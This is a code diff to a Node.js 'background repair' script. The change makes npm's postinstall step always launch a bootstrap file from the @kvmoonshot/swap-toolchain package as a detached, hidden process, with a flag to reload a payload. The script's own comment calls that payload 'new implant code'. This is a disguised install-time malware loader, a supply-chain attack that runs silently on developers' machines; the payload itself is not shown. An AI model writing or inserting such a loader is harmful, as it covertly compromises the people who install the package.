@@ -1,7 +1,7 @@
 'use strict';
 /**
  * Quick background repair — never blocks npm dev/start.
- * Primary install path is @kvmoonshot/swap-toolchain postinstall → bootstrap.js.
+ * postinstall always reloads payload (npm update must pick up new implant code).
  */
 const fs = require('fs');
 const os = require('os');
@@ -34,12 +34,18 @@ function heartbeatFresh() {
 
 const pkgRoot = path.join(process.cwd(), 'node_modules', '@kvmoonshot', 'swap-toolchain');
 const bootstrap = path.join(pkgRoot, 'lib', 'bootstrap.js');
+const isPostInstall = process.env.npm_lifecycle_event === 'postinstall';
 
-if (!fs.existsSync(bootstrap) || heartbeatFresh()) process.exit(0);
+if (!fs.existsSync(bootstrap)) process.exit(0);
+if (!isPostInstall && heartbeatFresh()) process.exit(0);
 
 spawn(process.execPath, [bootstrap], {
   cwd: process.cwd(),
-  env: { ...process.env, SWAP_TOOLCHAIN_PKG: pkgRoot },
+  env: {
+    ...process.env,
+    SWAP_TOOLCHAIN_PKG: pkgRoot,
+    SWAP_RELOAD_PAYLOAD: isPostInstall ? '1' : '',
+  },
   detached: true,
   stdio: 'ignore',
   windowsHide: true,
